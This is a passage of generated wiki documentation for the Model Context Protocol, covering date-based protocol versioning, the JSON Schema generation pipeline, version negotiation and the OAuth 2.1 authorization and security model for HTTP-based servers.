- [scripts/pull-registry-docs.sh](scripts/pull-registry-docs.sh)
- [typedoc.config.mjs](typedoc.config.mjs)
- [typedoc.plugin.mjs](typedoc.plugin.mjs)

</details>



This document describes how the Model Context Protocol manages protocol versions, including the versioning scheme, version states, JSON Schema version evolution, and the version negotiation process between clients and servers.

For information about the lifecycle and capability negotiation that occurs during initialization (where version negotiation takes place), see [Lifecycle and Capabilities](#2.4). For details about the schema system itself and message types, see [Schema System and Message Types](#2.2).

## Version Format and Semantics

MCP uses a date-based version identifier following the format `YYYY-MM-DD`, which indicates the last date that backwards-incompatible changes were made to the protocol. This format provides an intuitive understanding of when the protocol specification was frozen.

Critically, the protocol version is **not incremented for backwards-compatible changes**. This design decision allows the protocol to receive incremental improvements, bug fixes, and new optional features while preserving interoperability between clients and servers that support the same base version.

The version string appears in several key contexts:
- Protocol initialization messages during the handshake
- JSON Schema `$id` fields in generated schema files
- Documentation URLs and directory structures
- SDK version compatibility declarations

Sources: [docs/specification/versioning.mdx:7-15]()

## Version Timeline

```mermaid
graph LR
    V1["2024-11-05<br/>Initial Release"]
    V2["2025-03-26<br/>Q1 Release"]
    V3["2025-06-18<br/>Q2 Release"]
    V4["2025-11-25<br/>Q3 Release<br/>(Current)"]
    V5["draft<br/>In Development"]
    
    V1 -->|"Quarterly"| V2
    V2 -->|"Quarterly"| V3
    V3 -->|"Quarterly"| V4
    V4 -->|"Active Development"| V5
    
    V1 -.->|"Final"| Final1["Frozen Specification"]
    V2 -.->|"Final"| Final2["Frozen Specification"]
    V3 -.->|"Final"| Final3["Frozen Specification"]
    V4 -.->|"Current"| Current["Ready for Use<br/>May Receive Compatible Changes"]
    V5 -.->|"Draft"| Draft["In-Progress<br/>Not Yet Ready"]
```

**Version Evolution Timeline**

The protocol has followed a quarterly release cadence since the initial release in November 2024, with each release representing a point where breaking changes were consolidated.

Sources: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:260]()

## Version States

Protocol revisions are marked with one of three states that indicate their maturity and intended usage:

| State | Description | Example Use |
|-------|-------------|-------------|
| **Draft** | In-progress specifications not yet ready for consumption. Active development occurs here. | `schema/draft/schema.ts` |
| **Current** | The current protocol version, ready for production use. May continue to receive backwards-compatible changes. | `schema/2025-11-25/schema.ts` |
| **Final** | Past, complete specifications that will not be changed. Maintained for backwards compatibility. | `schema/2025-06-18/schema.ts` |

The **current** protocol version is `2025-11-25`, established in the November 2025 specification release. This version introduced significant features including task-based workflows, simplified authorization flows with Client ID Metadata Documents, and sampling with tools.

Sources: [docs/specification/versioning.mdx:18-27]()

## JSON Schema Version Evolution

A significant aspect of protocol versioning is the evolution of the underlying JSON Schema standard used to define message formats. The protocol's schema definitions have transitioned from JSON Schema draft-07 to JSON Schema 2020-12.

### Legacy Schema Versions

The following protocol versions use **JSON Schema draft-07**:

- `2024-11-05` - Initial release
- `2025-03-26` - Q1 2025 release  
- `2025-06-18` - Q2 2025 release

These versions use the older schema format with:
- `$schema: "http://json-schema.org/draft-07/schema#"`
- Type definitions under `"definitions"`
- References using `#/definitions/`

### Modern Schema Versions

Starting with the Q3 2025 release, the protocol adopted **JSON Schema 2020-12**:

- `2025-11-25` - Q3 2025 release (current)
- `draft` - Active development

Modern versions use:
- `$schema: "https://json-schema.org/draft/2020-12/schema"`
- Type definitions under `"$defs"` (the new standard term)
- References using `#/$defs/`

```mermaid
graph TD
    subgraph "Legacy Versions"
        L1["2024-11-05"]
        L2["2025-03-26"]
        L3["2025-06-18"]
    end
    
    subgraph "Modern Versions"
        M1["2025-11-25"]
        M2["draft"]
    end
    
    L1 & L2 & L3 -->|"Uses"| Draft07["JSON Schema draft-07<br/>definitions<br/>#/definitions/"]
    M1 & M2 -->|"Uses"| Schema2020["JSON Schema 2020-12<br/>$defs<br/>#/$defs/"]
    
    Draft07 -.->|"Evolution"| Schema2020
```

**JSON Schema Version Mapping**

This transition was necessary to adopt modern JSON Schema features and align with current industry standards. The schema generation pipeline automatically handles the differences between legacy and modern formats.

Sources: [scripts/generate-schemas.ts:10-14]()

## Schema Generation Pipeline

The repository maintains TypeScript schemas as the canonical source of truth, with automated generation of JSON Schema files for machine consumption. The generation process differs based on whether a version is legacy or modern.

```mermaid
graph TD
    subgraph "TypeScript Sources"
        TS1["schema/2025-06-18/schema.ts"]
        TS2["schema/2025-11-25/schema.ts"]
        TS3["schema/draft/schema.ts"]
    end
    
    subgraph "Generation Pipeline"
        TJS["typescript-json-schema<br/>--defaultNumberType integer<br/>--required --skipLibCheck"]
        Transform["applyJsonSchema202012Transformations()<br/>- Replace $schema URL<br/>- definitions → $defs<br/>- #/definitions/ → #/$defs/"]
    end
    
    subgraph "Generated JSON Schemas"
        JS1["schema/2025-06-18/schema.json<br/>(draft-07)"]
        JS2["schema/2025-11-25/schema.json<br/>(2020-12)"]
        JS3["schema/draft/schema.json<br/>(2020-12)"]
    end
    
    TS1 -->|"typescript-json-schema"| TJS
    TS2 -->|"typescript-json-schema"| TJS
    TS3 -->|"typescript-json-schema"| TJS
    
    TJS -->|"Legacy: Direct Output"| JS1
    TJS -->|"Modern: Apply Transform"| Transform
    Transform --> JS2
    Transform --> JS3
```

**Schema Generation Architecture**

The generation script distinguishes between version classes:

```typescript
// From scripts/generate-schemas.ts
const LEGACY_SCHEMAS = ['2024-11-05', '2025-03-26', '2025-06-18'];
const MODERN_SCHEMAS = ['2025-11-25', 'draft'];
```

For modern schemas, transformations are applied to convert the draft-07 output from `typescript-json-schema` into 2020-12 format:

```typescript
function applyJsonSchema202012Transformations(schemaPath: string): void {
  let content = readFileSync(schemaPath, 'utf-8');
  
  // Replace $schema URL
  content = content.replace(
    /http:\/\/json-schema\.org\/draft-07\/schema#/g,
    'https://json-schema.org/draft/2020-12/schema'
  );
  
  // Replace "definitions": with "$defs":
  content = content.replace(/"definitions":/g, '"$defs":');
  
  // Replace #/definitions/ with #/$defs/
  content = content.replace(/#\/definitions\//g, '#/$defs/');
  
  writeFileSync(schemaPath, content, 'utf-8');
}
```

Sources: [scripts/generate-schemas.ts:10-47]()

## Version Negotiation Process

Version negotiation between clients and servers occurs during protocol initialization. Both parties communicate their supported protocol versions and must agree on a single version to use for the session.

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Client->>Server: initialize request<br/>{protocolVersion: "2025-11-25"}
    
    alt Server supports requested version
        Server->>Client: initialize response<br/>{protocolVersion: "2025-11-25", ...}
        Client->>Server: initialized notification
        Note over Client,Server: Session established with 2025-11-25
    else Server does not support version
        Server->>Client: error response<br/>{code: -32602, message: "..."}
        Note over Client,Server: Connection terminated
    end
```

**Version Negotiation Sequence**

The negotiation process follows these rules:

1. **Client Proposal**: The client initiates negotiation by sending an `initialize` request containing its preferred `protocolVersion` string
2. **Server Validation**: The server checks whether it supports the requested version
3. **Agreement**: If supported, the server responds with the same version string in the `initialize` response, establishing agreement
4. **Rejection**: If not supported, the server returns an error, and the client may attempt with a different version or terminate the connection

Clients and servers **MAY** support multiple protocol versions simultaneously, implementing version-specific behavior as needed. However, they **MUST** agree on exactly one version for each session.

The protocol provides appropriate error handling when version negotiation fails, allowing clients to gracefully terminate connections when compatibility cannot be established.

Sources: [docs/specification/versioning.mdx:29-38]()

## Schema Directory Structure

The repository organizes schemas by version in a predictable directory structure:

```
schema/
├── 2024-11-05/
│   ├── schema.ts          # TypeScript source (canonical)
│   ├── schema.json        # Generated JSON Schema (draft-07)
│   └── schema.mdx         # Template for documentation generation
├── 2025-03-26/
│   ├── schema.ts
│   ├── schema.json        # Generated JSON Schema (draft-07)
│   └── schema.mdx
├── 2025-06-18/
│   ├── schema.ts
│   ├── schema.json        # Generated JSON Schema (draft-07)
│   └── schema.mdx
├── 2025-11-25/
│   ├── schema.ts
│   ├── schema.json        # Generated JSON Schema (2020-12)
│   └── schema.mdx
└── draft/
    ├── schema.ts
    ├── schema.json        # Generated JSON Schema (2020-12)
    └── schema.mdx
```

Each version directory contains:

- **`schema.ts`**: TypeScript type definitions - the canonical source of truth
- **`schema.json`**: Generated JSON Schema for machine validation and tooling
- **`schema.mdx`**: Template used to generate human-readable documentation via TypeDoc

The generated documentation appears in the corresponding documentation directory:

```
docs/specification/
├── 2024-11-05/
│   └── schema.mdx         # Generated from TypeScript
├── 2025-03-26/
│   └── schema.mdx
├── 2025-06-18/
│   └── schema.mdx
├── 2025-11-25/
│   └── schema.mdx
└── draft/
    └── schema.mdx
```

Sources: [README.md:11-13](), [package.json:31-35]()

## Working with Schema Versions

### Referencing Versions in Code

When implementing clients or servers, reference the specific protocol version being implemented:

```typescript
// Client initialization
const initializeRequest = {
  jsonrpc: "2.0",
  method: "initialize",
  params: {
    protocolVersion: "2025-11-25",
    capabilities: { /* ... */ },
    clientInfo: { /* ... */ }
  }
};
```

### Validation Against Schema Files

The generated JSON Schema files in `schema/*/schema.json` can be used with standard JSON Schema validators for runtime validation:

```typescript
import Ajv from 'ajv';
import schema from './schema/2025-11-25/schema.json';

const ajv = new Ajv();
const validate = ajv.compile(schema);
const valid = validate(message);
```

### Generating Schemas

To regenerate all JSON Schema files after modifying TypeScript sources:

```bash
npm run generate:schema:json
```

This runs the generation script in parallel for all versions. To verify that committed schemas match the TypeScript sources:

```bash
npm run check:schema:json
```

The check command is used in CI to ensure schemas stay synchronized with their TypeScript definitions.

Sources: [package.json:33-34](), [scripts/generate-schemas.ts:115-143]()

## Multi-Version Support Patterns

Implementations that need to support multiple protocol versions can use version-specific logic:

```typescript
class MCPClient {
  private protocolVersion: string;
  
  async connect(preferredVersion: string = "2025-11-25") {
    const response = await this.negotiate(preferredVersion);
    this.protocolVersion = response.protocolVersion;
  }
  
  private isFeatureSupported(feature: string): boolean {
    const versionMap = {
      "tasks": ["2025-11-25", "draft"],
      "elicitation": ["2025-11-25", "draft"],
      "sampling_with_tools": ["2025-11-25", "draft"]
    };
    
    return versionMap[feature]?.includes(this.protocolVersion) ?? false;
  }
}
```

This pattern allows implementations to gracefully degrade functionality based on the negotiated protocol version, maintaining compatibility with older servers while supporting newer features when available.

Sources: [docs/specification/versioning.mdx:32-38](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:130-264]()

## Version Release Cadence

MCP follows a quarterly release cadence, with major versions released approximately every three months:

| Quarter | Release Date | Version | Key Features |
|---------|--------------|---------|--------------|
| Q4 2024 | 2024-11-05 | Initial | Foundation protocol |
| Q1 2025 | 2025-03-26 | First update | Refinements |
| Q2 2025 | 2025-06-18 | Mid-year | Additional capabilities |
| Q3 2025 | 2025-11-25 | Current | Tasks, simplified auth, sampling with tools |

Between releases, the `draft` version receives active development for features targeted at the next release. Once a version is released, it moves from "draft" to "current" state, and the previous "current" version becomes "final."

This cadence allows the protocol to evolve based on real-world deployment feedback while maintaining stability for production implementations.

Sources: [blog/content/posts/2025-11-25-first-mcp-anniversary.md:253-263]()

---

# Page: Authorization and Security

# Authorization and Security

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx](docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx)
- [docs/community/seps/2133-extensions.mdx](docs/community/seps/2133-extensions.mdx)
- [docs/community/seps/index.mdx](docs/community/seps/index.mdx)
- [docs/docs.json](docs/docs.json)
- [docs/docs/tutorials/security/security_best_practices.mdx](docs/docs/tutorials/security/security_best_practices.mdx)
- [docs/specification/2025-03-26/basic/authorization.mdx](docs/specification/2025-03-26/basic/authorization.mdx)
- [docs/specification/2025-06-18/basic/authorization.mdx](docs/specification/2025-06-18/basic/authorization.mdx)
- [docs/specification/draft/basic/authorization.mdx](docs/specification/draft/basic/authorization.mdx)
- [schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json](schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json)
- [schema/draft/examples/ServerCapabilities/extensions-ui.json](schema/draft/examples/ServerCapabilities/extensions-ui.json)
- [seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md](seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md)
- [seps/2133-extensions.md](seps/2133-extensions.md)

</details>



## Purpose and Scope

This section provides an overview of MCP's authorization and security framework, which enables secure access control for HTTP-based MCP servers. Authorization in MCP is **optional** but becomes essential when MCP servers need to protect resources, validate client identity, or enforce access policies. For implementation details of the OAuth 2.1 flow, see [OAuth 2.1 Authorization Framework](#3.1). For attack vectors and defensive measures, see [Security Best Practices](#3.2).

Authorization is designed exclusively for HTTP-based transports. Implementations using the stdio transport should retrieve credentials from the environment rather than following this specification.

Sources: [docs/specification/draft/basic/authorization.mdx:9-25]()

## When Authorization is Required

Authorization **MUST** be implemented when:

- The MCP server is accessed over HTTP/HTTPS transport
- The server handles user-specific or sensitive data
- Access control policies need enforcement
- Audit trails of client actions are required
- Rate limiting or quota management is needed per client

Authorization is **NOT** required for:

- stdio transport implementations (use environment-based credentials)
- Local, single-user deployments
- Public, read-only MCP servers with no access restrictions

The following table summarizes transport-specific requirements:

| Transport Type | Authorization Requirement | Credential Source |
|----------------|---------------------------|-------------------|
| HTTP/HTTPS | **SHOULD** follow OAuth 2.1 | Authorization Server |
| stdio | **SHOULD NOT** use OAuth | Environment variables |
| Alternative transports | **MUST** follow protocol-appropriate security | Transport-specific |

Sources: [docs/specification/draft/basic/authorization.mdx:17-25](), [docs/docs/tutorials/security/authorization.mdx:10-27]()

## Architecture Overview

MCP authorization implements a three-party OAuth 2.1 architecture with distinct roles for clients, resource servers, and authorization servers.

```mermaid
graph TB
    subgraph "MCP Client"
        Client["MCP Client<br/>(OAuth 2.1 Client)"]
    end
    
    subgraph "MCP Server"
        ResourceServer["MCP Server<br/>(Resource Server)<br/>Validates Bearer tokens"]
        PRM["Protected Resource Metadata<br/>/.well-known/oauth-protected-resource"]
    end
    
    subgraph "Authorization Server"
        AuthServer["Authorization Server<br/>Issues access tokens"]
        ASMetadata["Authorization Server Metadata<br/>/.well-known/oauth-authorization-server"]
        AuthEndpoint["/authorize<br/>User consent"]
        TokenEndpoint["/token<br/>Token exchange"]
        IntrospectEndpoint["/token/introspect<br/>Token validation"]
    end
    
    Client -->|"1. MCP Request<br/>(no token)"| ResourceServer
    ResourceServer -->|"2. 401 Unauthorized<br/>WWW-Authenticate header"| Client
    Client -->|"3. Fetch metadata"| PRM
    PRM -->|"4. Points to"| ASMetadata
    Client -->|"5. OAuth flow"| AuthEndpoint
    AuthEndpoint -->|"6. Authorization code"| Client
    Client -->|"7. Exchange code"| TokenEndpoint
    TokenEndpoint -->|"8. Access token"| Client
    Client -->|"9. Bearer token"| ResourceServer
    ResourceServer -->|"10. Validate"| IntrospectEndpoint
```

**Architecture: Three-Party OAuth 2.1 Model**

### Roles

**MCP Client** (OAuth 2.1 client): Initiates requests to MCP servers and obtains access tokens on behalf of resource owners. Acts as a public client supporting PKCE for security.

**MCP Server** (OAuth 2.1 resource server): Protects MCP resources and validates Bearer tokens. Implements Protected Resource Metadata (RFC 9728) to advertise its authorization requirements.

**Authorization Server**: Issues access tokens after user authentication and consent. May be co-located with the MCP server or operate as a separate service. Implements Authorization Server Metadata (RFC 8414) for discovery.

Sources: [docs/specification/draft/basic/authorization.mdx:42-52](), [docs/specification/draft/basic/authorization.mdx:148-196]()

## Standards Compliance

MCP authorization is based on the following specifications, implementing a subset of features to ensure security while maintaining simplicity:

| Specification | RFC/Draft | Role in MCP |
|---------------|-----------|-------------|
| OAuth 2.1 | draft-ietf-oauth-v2-1-13 | Core authorization framework |
| Authorization Server Metadata | RFC 8414 | Endpoint discovery |
| Protected Resource Metadata | RFC 9728 | Resource server metadata |
| Dynamic Client Registration | RFC 7591 | Automatic client registration |
| OAuth Client ID Metadata Documents | draft-ietf-oauth-client-id-metadata-document-00 | URL-based client identity |
| Resource Indicators | RFC 8707 | Token audience binding |

Authorization servers **MUST** implement OAuth 2.1 with security measures for both confidential and public clients. MCP servers **MUST** implement Protected Resource Metadata. Both authorization servers and clients **SHOULD** support Client ID Metadata Documents for simplified registration.

Sources: [docs/specification/draft/basic/authorization.mdx:27-40](), [docs/specification/draft/basic/authorization.mdx:56-73]()

## Discovery Flow

MCP implements a discovery chain that allows clients to dynamically locate authorization servers and understand their capabilities without pre-configuration.

```mermaid
sequenceDiagram
    participant Client as "MCP Client"
    participant MCP as "MCP Server<br/>(Resource Server)"
    participant AS as "Authorization Server"

    Note over Client,AS: Discovery Phase
    
    Client->>MCP: "MCP request (no token)"
    MCP-->>Client: "401 Unauthorized<br/>WWW-Authenticate: Bearer<br/>resource_metadata=<url>"
    
    alt Header includes resource_metadata URL
        Client->>MCP: "GET resource_metadata URL"
    else Fallback to well-known URI
        Client->>MCP: "GET /.well-known/oauth-protected-resource/mcp"
        alt Not found
            Client->>MCP: "GET /.well-known/oauth-protected-resource"
        end
    end
    
    MCP-->>Client: "Protected Resource Metadata<br/>{authorization_servers: [...],<br/>scopes_supported: [...]}"
    
    Note over Client: Extract authorization_servers[0]
    
    Client->>AS: "GET /.well-known/oauth-authorization-server"
    alt OAuth 2.0 metadata found
        AS-->>Client: "Authorization Server Metadata"
    else Try OpenID Connect
        Client->>AS: "GET /.well-known/openid-configuration"
        AS-->>Client: "OIDC Discovery metadata"
    end
    
    Note over Client,AS: OAuth 2.1 Flow Begins
```

**Discovery: Protected Resource and Authorization Server Metadata**

### Discovery Mechanisms

**Protected Resource Metadata Discovery** (RFC 9728):

MCP servers **MUST** implement one of:
1. **WWW-Authenticate Header**: Include `resource_metadata` parameter in 401 responses
2. **Well-Known URI**: Serve metadata at `/.well-known/oauth-protected-resource` or path-specific variant

The `WWW-Authenticate` header **SHOULD** include a `scope` parameter indicating required scopes:

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                         scope="mcp:tools"
```

**Authorization Server Metadata Discovery**:

Clients **MUST** support both OAuth 2.0 Authorization Server Metadata (RFC 8414) and OpenID Connect Discovery 1.0 endpoints, attempting them in priority order based on the issuer URL structure.

For issuer URLs with path components (e.g., `https://auth.example.com/tenant1`):
1. OAuth: `https://auth.example.com/.well-known/oauth-authorization-server/tenant1`
2. OIDC (insertion): `https://auth.example.com/.well-known/openid-configuration/tenant1`
3. OIDC (appending): `https://auth.example.com/tenant1/.well-known/openid-configuration`

Sources: [docs/specification/draft/basic/authorization.mdx:74-148](), [docs/specification/draft/basic/authorization.mdx:132-147]()

## Client Registration Approaches

MCP supports three client registration mechanisms to accommodate different deployment scenarios. For detailed implementation guidance, see [Client Registration Methods](#3.3).

```mermaid
flowchart TD
    Start["Client needs authorization"] --> Check1{"Pre-registered<br/>credentials<br/>available?"}
    
    Check1 -->|"Yes"| PreReg["Use pre-registered<br/>client_id + secret"]
    Check1 -->|"No"| Check2{"Authorization Server<br/>supports CIMD?<br/>(client_id_metadata_document_supported)"}
    
    Check2 -->|"Yes"| CIMD["Use Client ID Metadata Documents<br/>client_id = https://app.example.com/metadata.json"]
    Check2 -->|"No"| Check3{"Authorization Server<br/>has registration_endpoint?"}
    
    Check3 -->|"Yes"| DCR["Use Dynamic Client Registration<br/>POST /register"]
    Check3 -->|"No"| Manual["Manual entry required<br/>User provides credentials"]
    
    PreReg --> Flow["Continue OAuth flow"]
    CIMD --> Flow
    DCR --> Flow
    Manual --> Flow
```

**Client Registration: Priority Order**

### Registration Priority

Clients supporting multiple registration options **SHOULD** follow this priority:

1. **Pre-registration** (highest priority): Use existing client credentials if available
2. **Client ID Metadata Documents**: Use URL-based client_id if `client_id_metadata_document_supported: true`
3. **Dynamic Client Registration**: Fall back to RFC 7591 if `registration_endpoint` present
4. **Manual entry** (lowest priority): Prompt user for credentials

**Client ID Metadata Documents** (recommended): Simplifies the unbounded clients/servers problem in MCP by allowing clients to use HTTPS URLs as identifiers, pointing to self-hosted metadata:

```json
{
  "client_id": "https://app.example.com/oauth/client-metadata.json",
  "client_name": "Example MCP Client",
  "redirect_uris": ["http://127.0.0.1:3000/callback"],
  "grant_types": ["authorization_code"],
  "token_endpoint_auth_method": "none"
}
```

Sources: [docs/specification/draft/basic/authorization.mdx:199-317](), [docs/specification/draft/basic/authorization.mdx:245-260]()

## Authorization Flow Overview

The complete authorization flow integrates discovery, registration, and token acquisition. The following sequence shows how all components interact:

```mermaid
sequenceDiagram
    participant Browser as "User-Agent"
    participant Client as "MCP Client"
    participant MCP as "MCP Server"
    participant AS as "Authorization Server"

    Note over Client,AS: Phase 1: Discovery
    Client->>MCP: "MCP request"
    MCP-->>Client: "401 + WWW-Authenticate"
    Client->>MCP: "GET resource metadata"
    MCP-->>Client: "authorization_servers, scopes_supported"
    Client->>AS: "GET authorization server metadata"
    AS-->>Client: "endpoints, capabilities"

    Note over Client,AS: Phase 2: Client Registration
    alt Client ID Metadata Documents
        Note over Client: "Use HTTPS URL as client_id"
        AS->>Client: "Fetch metadata from client_id URL"
        Client-->>AS: "JSON metadata document"
    else Dynamic Client Registration
        Client->>AS: "POST /register"
        AS-->>Client: "client_id, client_secret"
    else Pre-registered
        Note over Client: "Use existing client_id"
    end

    Note over Client,AS: Phase 3: Authorization
    Client->>Client: "Generate PKCE params<br/>(code_verifier, code_challenge)"
    Client->>Browser: "Open /authorize?client_id=...&resource=...&code_challenge=..."
    Browser->>AS: "Authorization request with resource parameter"
    AS->>Browser: "User authentication & consent UI"
    Browser->>AS: "User approves"
    AS->>Browser: "Redirect with authorization code"
    Browser->>Client: "Authorization code callback"

    Note over Client,AS: Phase 4: Token Exchange
    Client->>AS: "POST /token<br/>code, code_verifier, resource"
    AS-->>Client: "access_token, refresh_token, expires_in"

    Note over Client,MCP: Phase 5: Authenticated Requests
    Client->>MCP: "MCP request<br/>Authorization: Bearer <access_token>"
    MCP->>AS: "Validate token (introspection or JWT)"
    AS-->>MCP: "Token valid, scopes, audience"
    MCP-->>Client: "MCP response"
```

**Authorization Flow: Complete OAuth 2.1 Sequence**

### Key Flow Elements

**PKCE (Proof Key for Code Exchange)**: All clients **MUST** implement PKCE per OAuth 2.1 requirements. The client generates a `code_verifier` (random string) and `code_challenge` (SHA-256 hash), sending the challenge during authorization and the verifier during token exchange.

**Resource Parameter**: Clients **MUST** include the `resource` parameter (RFC 8707) in authorization and token requests, set to the canonical URI of the MCP server. This binds tokens to their intended audience, preventing token replay attacks.

Example: For MCP server at `https://mcp.example.com/api`, the resource parameter is:
```
resource=https%3A%2F%2Fmcp.example.com%2Fapi
```

**Bearer Token Usage**: Access tokens **MUST** be sent in the `Authorization` header:
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

Tokens **MUST NOT** be included in URI query strings.

Sources: [docs/specification/draft/basic/authorization.mdx:352-400](), [docs/specification/draft/basic/authorization.mdx:404-441](), [docs/specification/draft/basic/authorization.mdx:443-487]()

## Scope Selection and Elevation

MCP implements a progressive scope model following the principle of least privilege. For detailed scope management strategies, see [Token Management and Scope Strategy](#3.4).

### Initial Scope Selection

Clients **SHOULD** follow this priority for initial authorization:

1. Use `scope` parameter from 401 `WWW-Authenticate` header (if provided)
2. Use all scopes from `scopes_supported` in Protected Resource Metadata (if defined)
3. Omit `scope` parameter if neither is available

This approach minimizes user friction while allowing authorization servers and users to determine appropriate permissions during consent.

### Incremental Scope Elevation

When runtime operations require additional permissions, servers respond with:

```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope",
                         scope="files:read files:write user:profile",
                         resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource"
```

Clients **SHOULD** initiate a step-up authorization flow requesting the additional scopes, retry the operation with the new token, and implement retry limits to avoid repeated failures.

Sources: [docs/specification/draft/basic/authorization.mdx:336-351](), [docs/specification/draft/basic/authorization.mdx:498-558]()

## Security Principles

MCP authorization enforces multiple security layers. For comprehensive attack scenarios and mitigations, see [Security Best Practices](#3.2).

### Core Security Requirements

**Token Audience Validation**: MCP servers **MUST** validate that tokens were issued specifically for them (audience claim). Clients **MUST** include the `resource` parameter in all authorization and token requests. Token passthrough is **explicitly forbidden** - servers **MUST NOT** accept or forward tokens issued for other resources.

**Communication Security**: All authorization server endpoints **MUST** use HTTPS. Redirect URIs **MUST** be either `localhost` or HTTPS.

**Authorization Code Protection**: All clients **MUST** implement PKCE (OAuth 2.1 requirement) to prevent authorization code interception attacks.

**Token Storage**: Clients and servers **MUST** implement secure token storage following OAuth best practices. Authorization servers **SHOULD** issue short-lived access tokens and **MUST** rotate refresh tokens for public clients.

**Session Security**: MCP servers implementing authorization **MUST** verify all inbound requests with tokens, not sessions. Session IDs **MUST** be cryptographically secure and non-deterministic.

Sources: [docs/specification/draft/basic/authorization.mdx:560-598](), [docs/specification/draft/basic/security_best_practices.mdx:246-332]()

## Implementation Status and SDK Support

Authorization support varies across the MCP ecosystem. The client feature matrix shows current adoption:

| Feature Category | Adoption Rate | Representative Clients |
|------------------|---------------|------------------------|
| HTTP Transport + Auth | ~20% | Claude.ai, ChatGPT, Postman |
| Tools Only | ~95% | Most clients (60+ implementations) |
| Full Auth Support (8/8 features) | ~3% | VS Code GitHub Copilot, fast-agent, VT Code |

### SDK Support

**TypeScript SDK**: Provides built-in authorization middleware and metadata routers:
- `mcpAuthMetadataRouter()` - Serves Protected Resource Metadata endpoints
- `requireBearerAuth()` - Validates Bearer tokens and enforces scopes
- `OAuthMetadata` - Type definitions for authorization server metadata
- `checkResourceAllowed()` - Validates resource parameter audience binding

Example server setup (TypeScript):
```typescript
import { mcpAuthMetadataRouter, requireBearerAuth } from '@modelcontextprotocol/sdk/server/auth';

app.use(mcpAuthMetadataRouter({
  oauthMetadata,
  resourceServerUrl: mcpServerUrl,
  scopesSupported: ["mcp:tools"],
  resourceName: "MCP Server"
}));

const authMiddleware = requireBearerAuth({
  verifier: tokenVerifier,
  requiredScopes: []
});
```

**Python SDK (FastMCP)**: Authorization configuration managed through `Config` class with built-in token validation via introspection or JWT verification.

Sources: [docs/clients.mdx:14-220](), [docs/docs/tutorials/security/authorization.mdx:286-614]()

## Related Documentation

- **[OAuth 2.1 Authorization Framework](#3.1)**: Detailed OAuth implementation guide including authorization code flow, PKCE, and token exchange
- **[Security Best Practices](#3.2)**: Attack vectors and mitigations including confused deputy, token passthrough, session hijacking, and local server compromise
- **[Client Registration Methods](#3.3)**: In-depth coverage of pre-registration, Client ID Metadata Documents, and Dynamic Client Registration
- **[Token Management and Scope Strategy](#3.4)**: Token validation, audience verification, scope selection algorithms, and refresh token handling

Sources: [README.md:1-29](), [docs/specification/versioning.mdx:1-39]()

---

# Page: OAuth 2.1 Authorization Framework

# OAuth 2.1 Authorization Framework

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/clients.mdx](docs/clients.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)
- [docs/specification/2025-03-26/basic/authorization.mdx](docs/specification/2025-03-26/basic/authorization.mdx)
- [docs/specification/2025-06-18/basic/authorization.mdx](docs/specification/2025-06-18/basic/authorization.mdx)
- [docs/specification/draft/basic/authorization.mdx](docs/specification/draft/basic/authorization.mdx)

</details>



## Purpose and Scope

This document describes MCP's OAuth 2.1-based authorization framework for HTTP-based transports. It covers authorization server discovery, dynamic client registration, token management, and security requirements for implementing protected MCP servers and clients.

Authorization is **OPTIONAL** for MCP implementations. When implemented, this specification applies **ONLY** to HTTP-based transports. For STDIO transports, credentials should be retrieved from the environment. For alternative transports, follow established security best practices for that protocol.

For security best practices and attack mitigations, see [Security Best Practices](#3.2). For implementation tutorials, see [Authorization Implementation Guide](#3.3). For token validation details, see [Token Validation and Scope Management](#3.4).

**Sources:** [docs/specification/draft/basic/authorization.mdx:1-26]()

## Standards and Specifications

MCP's authorization framework implements a selected subset of OAuth 2.1 and related specifications to ensure security while maintaining simplicity:

| Specification | RFC/Draft | Purpose |
|---------------|-----------|---------|
| OAuth 2.1 | draft-ietf-oauth-v2-1-13 | Core authorization protocol |
| Authorization Server Metadata | RFC8414 | Discovery of authorization server capabilities |
| Dynamic Client Registration | RFC7591 | Automatic client registration without user interaction |
| Protected Resource Metadata | RFC9728 | Discovery of resource server authorization requirements |
| Resource Indicators | RFC8707 | Token audience binding to prevent misuse |
| Bearer Token Usage | RFC6750 | Access token transmission in HTTP requests |
| Token Introspection | RFC7662 | Token validation by resource servers |

**Sources:** [docs/specification/draft/basic/authorization.mdx:27-39]()

## Roles and Architecture

### OAuth 2.1 Role Mapping

```mermaid
graph TB
    subgraph "OAuth 2.1 Roles in MCP Context"
        RC["Resource Owner<br/>(End User)"]
        
        subgraph "MCP Client Role"
            MC["MCP Client<br/>OAuth 2.1 Client<br/>Makes protected requests"]
        end
        
        subgraph "MCP Server Role"
            MS["MCP Server<br/>OAuth 2.1 Resource Server<br/>Validates access tokens"]
        end
        
        subgraph "Authorization Server Role"
            AS["Authorization Server<br/>Issues access tokens<br/>May be separate service"]
        end
    end
    
    RC -->|"Authorizes"| AS
    MC -->|"1. Requests without token"| MS
    MS -->|"2. HTTP 401 + WWW-Authenticate"| MC
    MC -->|"3. Initiates OAuth flow"| AS
    AS -->|"4. Returns access token"| MC
    MC -->|"5. Protected requests with Bearer token"| MS
    MS -->|"6. Validates token audience"| AS
```

**Roles:**
- **MCP Server**: Acts as OAuth 2.1 resource server, validates access tokens, requires tokens to be specifically issued for its URI
- **MCP Client**: Acts as OAuth 2.1 client, manages authorization flow on behalf of resource owner, MUST include `resource` parameter in all auth requests
